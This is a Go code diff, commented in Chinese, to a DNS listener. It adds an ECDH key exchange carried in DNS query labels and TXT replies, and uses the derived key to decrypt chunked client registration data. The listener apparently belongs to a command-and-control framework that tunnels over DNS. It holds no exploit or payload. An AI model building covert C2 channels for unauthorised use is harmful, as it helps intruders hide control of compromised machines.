@@ -303,6 +303,16 @@ func (l *Listener) handleDNSRequest(w dns.ResponseWriter, r *dns.Msg) {
 		}
 		uid := strings.Join(parts[3:], "")
 		l.handleMetaInfo(w, r, m, parts[0], parts[1], uid, clientIP)
+	case "kx":
+		// 会话前 ECDH 交换（b32pub.1_1.kx.uid 分标签）。
+		// 格式与 mi 同形，因此 uid 在这一步就已知 —— 可以按 uid 绑定派生结果，
+		// 后续 mi 分块直接用该密钥解，不需要额外协商句柄。
+		if len(parts) < 4 {
+			w.WriteMsg(m)
+			return
+		}
+		uid := strings.Join(parts[3:], "")
+		l.handleKX(w, r, m, parts[0], uid)
 	default:
 		// fb/pl/hb: 标识 = uid（32 hex，单标签），分标签重组
 		uid := strings.Join(parts[:len(parts)-2], "")
@@ -535,6 +545,51 @@ func (l *Listener) updateClientOnline(uid string) {
 
 // handleMetaInfo 接收客户端分块上行的加密 MetaInfo，重组后注册客户端并派生会话密钥。
 // 查询名: <chunk>.<idx_total>.mi.<uid>.<domain>
+// handleKX 会话前 ECDH 交换：解出客户端公钥 → 派生 → 缓存（按 uid 绑定）→ 回服务端公钥。
+//
+// 公钥用 base32 放在一个子域标签里（32 字节 → 52 字符，未超 63 字符上限），
+// 服务端公钥放 TXT（同 52 字符，远低于 255 字节）。
+//
+// 失败一律回空响应并且不缓存 —— 客户端拿不到公钥就会回落静态密钥，
+// 与"服务端不支持 ECDH"表现一致。
+func (l *Listener) handleKX(w dns.ResponseWriter, r *dns.Msg, m *dns.Msg, chunk, uid string) {
+	if chunk == "" || uid == "" {
+		w.WriteMsg(m)
+		return
+	}
+	peerPub, err := base32.HexEncoding.WithPadding(base32.NoPadding).DecodeString(strings.ToUpper(chunk))
+	if err != nil || len(peerPub) != encrypt.ECDHPublicKeySize {
+		logx.Warnf("⚠️ [DNS-KX] 客户端公钥不可用: %v\n", err)
+		w.WriteMsg(m)
+		return
+	}
+	srv, err := encrypt.NewServerKeyExchange()
+	if err != nil {
+		w.WriteMsg(m)
+		return
+	}
+	mk, err := srv.DeriveMasterKey(peerPub, l.salt)
+	if err != nil {
+		logx.Warnf("⚠️ [DNS-KX] 派生失败: %v\n", err)
+		w.WriteMsg(m)
+		return
+	}
+	if _, err := encrypt.GlobalKxCache.Put(peerPub, mk); err != nil {
+		w.WriteMsg(m)
+		return
+	}
+	// uid 在查询名里已知：立即绑定，供后续 mi 分块按 uid 取用
+	encrypt.GlobalKxCache.Bind(peerPub, uid)
+	setTXTReply(m, r, base32HexLower(srv.PublicKey()))
+	logx.Infof("🔑 [DNS-KX] 完成会话前密钥交换（uid=%s）\n", uid)
+	w.WriteMsg(m)
+}
+
+// base32HexLower 与服务端其它处一致：base32-hex、无填充、小写
+func base32HexLower(b []byte) string {
+	return strings.ToLower(strings.TrimRight(
+		base32.HexEncoding.WithPadding(base32.NoPadding).EncodeToString(b), "="))
+}
 func (l *Listener) handleMetaInfo(w dns.ResponseWriter, r *dns.Msg, m *dns.Msg, chunk, chunkInfo, uid, clientIP string) {
 	if chunk == "" || uid == "" {
 		w.WriteMsg(m)
@@ -600,6 +655,14 @@ func (l *Listener) handleMetaInfo(w dns.ResponseWriter, r *dns.Msg, m *dns.Msg, 
 		return
 	}
 	metaMK, metaSalt := l.masterKey, l.salt
+	// 若该 uid 已完成会话前 ECDH 交换，必须用派生主密钥解 MetaInfo ——
+	// 客户端此时是用派生密钥加密的；继续用静态密钥只会得到"解密失败"，
+	// 而现象只是"DNS 客户端注册不上"，很难联想到密钥来源。
+	if kxMK, ok := encrypt.GlobalKxCache.LookupByUID(uid); ok {
+		metaMK = kxMK
+		// 盐仍用监听器自己的：客户端派生时用的就是它
+		metaSalt = l.salt
+	}
 	// J4: 拒绝公开默认密钥连接
 	if encrypt.IsDefaultListenerKey(metaMK, metaSalt) {
 		logx.Warnf("⚠️ [DNS-METAINFO] 监听器使用公开默认密钥，拒绝注册\n")
